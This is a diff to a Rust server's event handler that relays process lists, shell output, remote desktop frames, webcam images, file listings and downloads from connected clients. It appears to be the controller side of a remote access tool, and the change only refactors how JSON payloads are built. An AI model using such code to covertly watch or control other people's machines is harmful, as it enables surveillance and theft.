@@ -229,30 +229,26 @@ impl ServerWrapper {
                 },
                 
                 ProcessList(addr, process_list) => {
-                    let payload = serde_json::json!({
+                    self.handle_client_data(&addr, "process list", "process_list", serde_json::json!({
                         "addr": addr.to_string(),
                         "processes": process_list.processes.clone()
-                    });
-                    self.handle_client_data(&addr, "process list", "process_list", payload).await;
+                    })).await;
                 },
                 
                 ShellOutput(addr, output) => {
-                    let payload = serde_json::json!({
+                    self.handle_client_data(&addr, "shell output", "client_shellout", serde_json::json!({
                         "addr": addr.to_string(),
                         "shell_output": output.clone()
-                    });
-                    self.handle_client_data(&addr, "shell output", "client_shellout", payload).await;
+                    })).await;
                 },
                 
                 RemoteDesktopFrame(addr, frame) => {
-                    let base64_img = general_purpose::STANDARD.encode(&frame.data);
-                    let payload = serde_json::json!({
+                    self.emit_serde_payload("remote_desktop_frame", serde_json::json!({
                         "addr": addr.to_string(),
                         "timestamp": frame.timestamp,
                         "display": frame.display,
-                        "data": base64_img
-                    });
-                    self.emit_serde_payload("remote_desktop_frame", payload).await;
+                        "data": general_purpose::STANDARD.encode(&frame.data)
+                    })).await;
                 },
                 
                 WebcamResult(addr, frame) => {
@@ -262,19 +258,17 @@ impl ServerWrapper {
                 },
                 
                 FileList(addr, files) => {
-                    let payload = serde_json::json!({
+                    self.emit_serde_payload("files_result", serde_json::json!({
                         "addr": addr.to_string(),
                         "files": files
-                    });
-                    self.emit_serde_payload("files_result", payload).await;
+                    })).await;
                 },
                 
                 CurrentFolder(addr, path) => {
-                    let payload = serde_json::json!({
+                    self.emit_serde_payload("current_folder", serde_json::json!({
                         "addr": addr.to_string(),
                         "path": path
-                    });
-                    self.emit_serde_payload("current_folder", payload).await;
+                    })).await;
                 },
                 
                 DisksResult(addr, disks) => {
@@ -283,11 +277,10 @@ impl ServerWrapper {
                         name: format!("{}:\\", disk),
                     }).collect::<Vec<_>>();
                     
-                    let payload = serde_json::json!({
+                    self.emit_serde_payload("files_result", serde_json::json!({
                         "addr": addr.to_string(),
                         "files": files
-                    });
-                    self.emit_serde_payload("files_result", payload).await;
+                    })).await;
                 },
                 
                 DownloadFileResult(addr, file_data) => {
